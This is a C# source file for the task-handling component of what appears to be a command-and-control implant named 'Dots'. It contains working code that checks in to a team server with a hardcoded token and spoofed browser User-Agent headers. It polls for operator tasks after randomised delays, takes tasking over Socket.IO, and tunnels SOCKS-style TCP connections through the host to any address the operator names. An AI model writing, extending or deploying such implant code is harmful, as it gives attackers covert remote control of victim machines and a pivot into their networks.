using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Text.Json;
using System.Collections.Concurrent;
using Dots.Models;
using System.Threading;
using SocketIOClient;
using System.Net.Sockets;
using System.Net;
using System.Text.Json.Serialization;

namespace Dots
{
    public class TaskManager
    {
        public string TeamServerUri { get; set; }

        private ConcurrentQueue<TaskRequest> _batchRequest = new ConcurrentQueue<TaskRequest>();
        private ConcurrentQueue<TaskResult> _batchResults = new ConcurrentQueue<TaskResult>();
        private ConcurrentQueue<TaskError> _batchErrors = new ConcurrentQueue<TaskError>();
        private DotsProperties _dotsProperty;
        private static SocketIO _socketIOClient;
        private TaskResult _checkInTask { get; set; }
        private readonly HttpClient _client = new HttpClient();

        public TaskManager(string teamServerUri, DotsProperties dotsProperty)
        {
            TeamServerUri = teamServerUri;
            _dotsProperty = dotsProperty;
        }

        public void Init()
        {
            _client.BaseAddress = new Uri(TeamServerUri);
            _client.DefaultRequestHeaders.Clear();
            _client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64; 1920x1080) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 en-GB");
            _client.DefaultRequestHeaders.Add("Accept", "application/json");
            _client.DefaultRequestHeaders.Add("Authorization", $"JWT e2FsZzpvckZ1UFYsdHlwOkpXVH0=.e3N1YjpvckZ1UFYsbmFtZTpKb2huIERvZSxpYXQ6MTY5NTgzODc1N30=.b3JGdVBW");
            _socketIOClient = new SocketIO(TeamServerUri, new SocketIOOptions
            {
                ExtraHeaders = new Dictionary<string, string> { { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0" } }

            });
            _socketIOClient.On("ping", request =>
            {
                Ping();
            });
            _socketIOClient.On("batch_request", request =>
            {
                ParseBatchRequest(request.GetValue<TaskRequest[]>());
            });
            _socketIOClient.On("stream_connect", request =>
            {
                _ = StreamConnect(request.GetValue<string>());
            });

            _socketIOClient.On("stream_upstream", request =>
            {
                StreamUpstream(request.GetValue<string>());
            });
            _dotsProperty.SocketIOClient = _socketIOClient;
        }

        private static void Ping()
        {
            _socketIOClient.EmitAsync("pong");
        }

        public string InitialCheckin(string key)
        {
            TaskResult initialCheckinTask = new TaskResult
            {
                JSONRPC = "2.0",
                Result = "",
                Id = key
            };
            string json = JsonSerializer.Serialize(initialCheckinTask);
            HttpResponseMessage response = _client.PostAsync("/Dots", new StringContent(json, Encoding.UTF8, "application/json")).Result;
            if (response.IsSuccessStatusCode)
            {
                string checkInTaskId = response.Content.ReadAsStringAsync().Result;

                if (checkInTaskId.Length != 10)
                {
                    return null;
                }
                _checkInTask = new TaskResult
                {
                    JSONRPC = "2.0",
                    Result = "",
                    Id = checkInTaskId
                };
                return checkInTaskId;
            }
            else
            {
                return null;
            }
        }



        public async Task RetrieveTasks()
        {
            while (_dotsProperty.RetrieveTasks)
            {
                // Retrieve all Results and Errors
                IEnumerable<DotsTask> batchResult = RetrieveBatchResults();
                IEnumerable<DotsTask> batchErrors = RetrieveBatchErrors();
                List<object> batchResponse = new List<object>();
                batchResponse.AddRange(batchResult);
                batchResponse.AddRange(batchErrors);
                await Task.Delay(_dotsProperty.GenerateDelay());

                if (_checkInTask != null)
                {
                    _batchResults.Enqueue(_checkInTask);
                }
                else
                {
                    continue;
                }

                // Combine response and errors into a single list
                string json = JsonSerializer.Serialize(batchResponse);
                HttpResponseMessage response = new HttpResponseMessage();
                try
                {
                    response = await _client.PostAsync("/Dots", new StringContent(json, Encoding.UTF8, "application/json"));
                }
                catch
                {
                    continue;
                }
                if (response.IsSuccessStatusCode)
                {
                    try
                    {
                        string responseBody = await response.Content.ReadAsStringAsync();
                        var tasks = JsonSerializer.Deserialize<TaskRequest[]>(responseBody);
                        ParseBatchRequest(tasks);
                    }
                    catch (Exception ex)
                    {
                        TaskError failedToParseError = new TaskError
                        {
                            JSONRPC = "2.0",
                            Error = new TaskErrorDetails
                            {
                                Code = -32700,
                                Message = Convert.ToBase64String(Encoding.UTF8.GetBytes(ex.Message)),
                            },
                            Id = null
                        };
                        _batchErrors.Enqueue(failedToParseError);
                    }
                }
            }
        }

        public void ParseBatchRequest(TaskRequest[] tasks)
        {
            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                {
                    _batchRequest.Enqueue(task);
                }
            }
        }

        public bool RetrieveBatchRequest(out IEnumerable<TaskRequest> tasks)
        {
            if (_batchRequest.IsEmpty)
            {
                tasks = null;
                return false;
            }

            var list = new List<TaskRequest>();
            while (_batchRequest.TryDequeue(out var task))
            {
                list.Add(task);
            }
            tasks = list;
            return true;
        }

        private IEnumerable<TaskResult> RetrieveBatchResults()
        {
            var tasks = new List<TaskResult>();
            while (_batchResults.TryDequeue(out var task))
            {
                tasks.Add(task);
            }
            return tasks;
        }
        private IEnumerable<TaskError> RetrieveBatchErrors()
        {
            var tasks = new List<TaskError>();
            while (_batchErrors.TryDequeue(out var task))
            {
                tasks.Add(task);
            }
            return tasks;
        }

        public void SendResult(string result, string id)
        {
            TaskResult resultTask = new TaskResult
            {
                JSONRPC = "2.0",
                Result = result,
                Id = id
            };
            if (_socketIOClient.Connected)
            {
                _dotsProperty.SocketIOClient.EmitAsync("batch_response", resultTask);
            } else
            {
                _batchResults.Enqueue(resultTask);
            }
        }

        public void SendError(int errorCode, string message, string id)
        {
            TaskError errorTask = new TaskError
            {
                JSONRPC = "2.0",
                Error = new TaskErrorDetails
                {
                    Code = errorCode,
                    Message = message,
                },
                Id = id,
            };
            if (_socketIOClient.Connected)
            {
                _dotsProperty.SocketIOClient.EmitAsync("batch_response", errorTask);
            }
            else
            {
                _batchErrors.Enqueue(errorTask);
            }
        }

        private class StreamConnectRequest
        {
            [JsonPropertyName("atype")]
            public int atype { get; set; }

            [JsonPropertyName("address")]
            public string address { get; set; }

            [JsonPropertyName("port")]
            public int port { get; set; }

            [JsonPropertyName("client_id")]
            public long client_id { get; set; }
        }

        private class StreamConnectResults
        {
            [JsonPropertyName("atype")]
            public int atype { get; set; }

            [JsonPropertyName("rep")]
            public int rep { get; set; }

            [JsonPropertyName("bind_addr")]
            public string bind_addr { get; set; }

            [JsonPropertyName("bind_port")]
            public string bind_port { get; set; }

            [JsonPropertyName("client_id")]
            public long client_id { get; set; }
        }

        private async Task StreamConnect(string socksConnectRequest)
        {
            var request = JsonSerializer.Deserialize<StreamConnectRequest>(socksConnectRequest);
            Socket remote = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            SocketAsyncEventArgs connectEventArgs = new SocketAsyncEventArgs();
            connectEventArgs.RemoteEndPoint = new DnsEndPoint(request.address, request.port);
            connectEventArgs.Completed += (sender, args) =>
            {
                if (args.SocketError == SocketError.Success)
                {
                    _dotsProperty.RemoteConnections.Add(request.client_id, remote);

                    string bindAddr = ((IPEndPoint)remote.LocalEndPoint).Address.ToString();
                    string bindPort = ((IPEndPoint)remote.LocalEndPoint).Port.ToString();

                    StreamConnectResults response = new StreamConnectResults
                    {
                        atype = request.atype,
                        rep = 0,
                        bind_addr = bindAddr,
                        bind_port = bindPort,
                        client_id = request.client_id
                    };
                    _dotsProperty.SocketIOClient.EmitAsync("stream_connect_results", response);
                    Stream(remote, request.client_id);
                }
                else
                {
                    StreamConnectResults response = new StreamConnectResults
                    {
                        atype = request.atype,
                        rep = 1,
                        bind_addr = null,
                        bind_port = null,
                        client_id = request.client_id
                    };
                    _dotsProperty.SocketIOClient.EmitAsync("stream_disconnect_results", response);
                }
            };
            remote.ConnectAsync(connectEventArgs);
        }

        private class DownstreamResults
        {
            [JsonPropertyName("data")]
            public string data { get; set; }

            [JsonPropertyName("client_id")]
            public long client_id { get; set; }
        }

        private void Stream(Socket remote, long client_id)
        {
            byte[] downstream_data = new byte[4096];
            SocketAsyncEventArgs e = new SocketAsyncEventArgs();
            e.SetBuffer(downstream_data, 0, downstream_data.Length);
            e.Completed += (sender2, args2) =>
            {
                if (e.SocketError == SocketError.Success && e.BytesTransferred > 0)
                {
                    DownstreamResults socks_downstream_result = new DownstreamResults
                    {
                        data = Convert.ToBase64String(e.Buffer, 0, e.BytesTransferred),
                        client_id = client_id,
                    };

                    _dotsProperty.SocketIOClient.EmitAsync("stream_downstream_results", socks_downstream_result);
                    remote.ReceiveAsync(e);
                }
            };
            remote.ReceiveAsync(e);
        }

        private class UpStreamRequest
        {
            [JsonPropertyName("data")]
            public string data { get; set; }

            [JsonPropertyName("client_id")]
            public long client_id { get; set; }
        }

        private void StreamUpstream(string socksUpstreamRequest)
        {
            try
            {
                UpStreamRequest request = JsonSerializer.Deserialize<UpStreamRequest>(socksUpstreamRequest);
                _dotsProperty.RemoteConnections[request.client_id].Send(Convert.FromBase64String(request.data));
            }
            catch (Exception e)
            {
                return;
            }
        }
    }
}